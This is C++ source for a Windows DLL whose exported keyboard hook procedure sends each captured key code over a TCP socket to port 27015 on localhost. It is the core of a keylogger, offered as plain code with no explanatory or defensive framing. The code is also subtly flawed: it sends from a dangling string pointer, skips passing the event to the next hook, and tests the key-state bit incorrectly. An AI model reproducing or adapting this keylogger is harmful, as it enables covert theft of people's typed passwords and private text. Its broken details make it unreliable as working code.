#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <wchar.h>
#include <string>
#include <ws2tcpip.h>
#include <stdlib.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

using namespace std;

#ifdef __cplusplus   
extern "C" {         
#endif
 
__declspec(dllexport) LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam){
    int isKeyDown = (int)lParam >> 30;

    if (isKeyDown){
      WSADATA wsaData;
      SOCKET ConnectSocket = INVALID_SOCKET;
      struct addrinfo *result = NULL,
                      *ptr = NULL,
                      hints;
      // string data = to_string(keyboard_ll_p->vkCode);
      const char *sendbuf = to_string(wParam).c_str();

      WSAStartup(MAKEWORD(2,2), &wsaData);

      ZeroMemory( &hints, sizeof(hints) );
      hints.ai_family = AF_UNSPEC;
      hints.ai_socktype = SOCK_STREAM;
      hints.ai_protocol = IPPROTO_TCP;

      getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);

      ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

      connect( ConnectSocket, result->ai_addr, (int)result->ai_addrlen);

      freeaddrinfo(result);

      send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 );

      shutdown(ConnectSocket, SD_SEND);

      closesocket(ConnectSocket);
      WSACleanup();

    }
    
  
  return 0;
}


#ifdef __cplusplus
}
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){
    return true;
}
